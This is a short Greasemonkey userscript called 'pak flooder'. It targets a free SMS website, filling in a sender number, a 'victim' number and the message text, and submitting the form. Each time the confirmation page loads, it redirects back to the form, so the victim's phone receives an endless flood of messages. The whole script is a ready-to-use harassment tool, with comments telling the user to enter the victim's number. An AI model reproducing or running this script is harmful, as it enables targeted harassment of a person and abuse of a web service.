// ==UserScript==
// @name           pak flooder
// @namespace      Vipul
// @include        http://sms4smile.com/*
// ==/UserScript==

var victim="1234567890"; //change victim's no
var sender="1234567890"; // change senders no.
var smstext="flooding"; // change the text

if(document.location=="http://sms4smile.com/send-free-sms/")
{
document.forms[0].elements[1].value=sender;

document.forms[0].elements[2].value=victim;

document.forms[0].elements[3].value=smstext;

document.forms[0].elements[5].click();

}
if(document.location=="http://sms4smile.com/sms-sent/")
{
document.location="http://sms4smile.com/send-free-sms/";
}